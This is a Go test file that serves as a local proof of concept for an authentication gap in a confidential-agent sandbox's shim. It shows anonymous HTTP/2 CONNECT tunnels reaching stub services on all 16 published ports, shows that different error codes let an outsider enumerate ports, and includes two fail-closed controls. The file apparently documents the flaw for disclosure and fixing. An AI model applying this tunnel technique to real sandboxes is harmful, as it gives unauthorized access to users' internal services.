package main

// PoC (local only): confidential-agent-sandbox publishes 16 loopback ports and
// sets shim.authenticated: false. In that configuration cvmimage's shim builds
// NO key validator (cmd/shim/main.go:259-290), and the CONNECT tunnel
// (cmd/shim/tunnel.go + api.go authorize closure) therefore opens a raw TCP
// stream to any published port for any HTTP/2 client that knows the hostname,
// with no credential of any kind.
//
// This test drives the shipped NewShimServer exactly as main.go would for the
// sandbox config (validator == nil, Authenticated == false) with the real
// published-port list parsed from confidential-agent-sandbox/tinfoil-config.yml,
// and shows an anonymous CONNECT reaching stub services bound on
// 127.0.0.1:<port> (the shim's PublishedHostIP) for every one of the 16 ports.
// Two controls follow: authenticated:true + validator -> 401, and
// authenticated:true without validator -> fail closed (404).

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"sort"
	"strconv"
	"strings"
	"testing"

	"github.com/tinfoilsh/encrypted-http-body-protocol/identity"

	tinfoilattestation "tinfoil/internal/attestation"
	"tinfoil/internal/config"
	"tinfoil/internal/containernet"
	"tinfoil/internal/key"
	"tinfoil/internal/legacy"
)

// SANDBOX_CONFIG points at confidential-agent-sandbox@d78ec38 tinfoil-config.yml (run.sh sets it).
var sandboxConfigPath = os.Getenv("SANDBOX_CONFIG")

// stubService answers like a password-less Redis to PING and otherwise
// reports which published port answered. It stands in for whatever the
// sandbox owner (or the AI agent inside) binds on 0.0.0.0 in the sandbox
// container, which cvmimage DNATs to 127.0.0.1:<port>.
func stubService(t *testing.T, port string) {
	t.Helper()
	listener, err := net.Listen("tcp", net.JoinHostPort(containernet.PublishedHostIP, port))
	if err != nil {
		t.Fatalf("binding stub on %s: %v", port, err)
	}
	t.Cleanup(func() { listener.Close() })
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			go func() {
				defer conn.Close()
				line, _ := bufio.NewReader(conn).ReadString('\n')
				if strings.TrimSpace(line) == "PING" {
					fmt.Fprintf(conn, "+PONG (stub on published port %s)\r\n", port)
					return
				}
				fmt.Fprintf(conn, "stub on published port %s got %q\n", port, strings.TrimSpace(line))
			}()
		}
	}()
}

func sandboxShim(t *testing.T, validator key.Validator, authenticated bool, targets map[string]bool) *httptest.Server {
	t.Helper()
	id, err := identity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	att := &legacy.Document{Format: "https://tinfoil.sh/predicate/dummy/v2", Body: "deadbeef"}
	// Mirrors the measured shim block of confidential-agent-sandbox/tinfoil-config.yml:
	//   shim: {upstream-port: 8080, authenticated: false, paths: [/enroll, /healthz]}
	cfg := &config.Config{UpstreamPort: 8080, Authenticated: authenticated, Paths: []string{"/enroll", "/healthz"}, ControlPlane: "https://api.tinfoil.sh"}
	ext := &config.ExternalConfig{Env: map[string]string{"DOMAIN": "some-sandbox.box2.tinfoil.sh"}}
	shim := NewShimServer(validator, nil, att, tinfoilattestation.BodyV2{}, 0, id, nil, nil, cfg, ext, "127.0.0.1:8080", targets)
	server := httptest.NewUnstartedServer(shim)
	server.EnableHTTP2 = true
	server.StartTLS()
	t.Cleanup(server.Close)
	return server
}

func TestPoC_SandboxTunnelNeedsNoCredential(t *testing.T) {
	if _, err := os.Stat(sandboxConfigPath); err != nil {
		t.Fatalf("SANDBOX_CONFIG not readable: %v", err)
	}
	targets, err := publishedPorts(sandboxConfigPath)
	if err != nil {
		t.Fatalf("parsing %s: %v", sandboxConfigPath, err)
	}
	ports := make([]string, 0, len(targets))
	for port := range targets {
		ports = append(ports, port)
	}
	sort.Slice(ports, func(i, j int) bool { a, _ := strconv.Atoi(ports[i]); b, _ := strconv.Atoi(ports[j]); return a < b })
	t.Logf("confidential-agent-sandbox publishes %d ports: %s", len(ports), strings.Join(ports, " "))

	for _, port := range ports {
		stubService(t, port)
	}

	// Production shape for authenticated:false -> main.go never builds a validator.
	server := sandboxShim(t, nil, false, targets)

	reached := 0
	for _, port := range ports {
		// Anonymous client: no Authorization header, no API key, no permit, nothing.
		resp, writer := connectTo(t, server, "some-sandbox.box2.tinfoil.sh:"+port, http.Header{})
		if resp.StatusCode != http.StatusOK {
			t.Errorf("port %s: anonymous CONNECT status = %d", port, resp.StatusCode)
			continue
		}
		if _, err := io.WriteString(writer, "PING\r\n"); err != nil {
			t.Fatalf("port %s: write: %v", port, err)
		}
		reply, err := bufio.NewReader(resp.Body).ReadString('\n')
		if err != nil {
			t.Fatalf("port %s: read: %v", port, err)
		}
		writer.Close()
		t.Logf("port %5s: anonymous CONNECT -> %d, service replied %q", port, resp.StatusCode, strings.TrimSpace(reply))
		if strings.HasPrefix(reply, "+PONG") {
			reached++
		}
	}
	if reached != len(ports) {
		t.Fatalf("reached %d of %d published ports", reached, len(ports))
	}
	t.Logf("RESULT: an unauthenticated internet client reached a service on all %d published sandbox ports through the shim tunnel", reached)

	// Unpublished port: the shim answers 404 rather than 401, so an anonymous
	// client can also enumerate which ports a sandbox publishes.
	resp, _ := connectTo(t, server, "some-sandbox.box2.tinfoil.sh:8080", http.Header{})
	t.Logf("port  8080 (not published): anonymous CONNECT -> %d (%s)", resp.StatusCode, http.StatusText(resp.StatusCode))
}

func TestPoC_SandboxTunnelControls(t *testing.T) {
	targets := map[string]bool{"6379": true}
	stubService(t, "6379")

	// Control 1: the same shim with authenticated:true and a validator refuses
	// a keyless CONNECT with 401 (this is the tested production behaviour for
	// authenticated deployments, cf. TestTunnelRequiresAPIKey).
	server := sandboxShim(t, &fakeValidator{}, true, targets)
	resp, _ := connectTo(t, server, "some-sandbox.box2.tinfoil.sh:6379", http.Header{})
	t.Logf("control authenticated:true + validator, keyless CONNECT -> %d", resp.StatusCode)
	if resp.StatusCode != http.StatusUnauthorized {
		t.Errorf("want 401, got %d", resp.StatusCode)
	}

	// Control 2: authenticated:true with no validator fails closed (api.go:304-307).
	server = sandboxShim(t, nil, true, targets)
	resp, _ = connectTo(t, server, "some-sandbox.box2.tinfoil.sh:6379", http.Header{})
	t.Logf("control authenticated:true, no validator, keyless CONNECT -> %d (tunnels disabled)", resp.StatusCode)
	if resp.StatusCode == http.StatusOK {
		t.Errorf("fail-closed path opened a tunnel")
	}
}
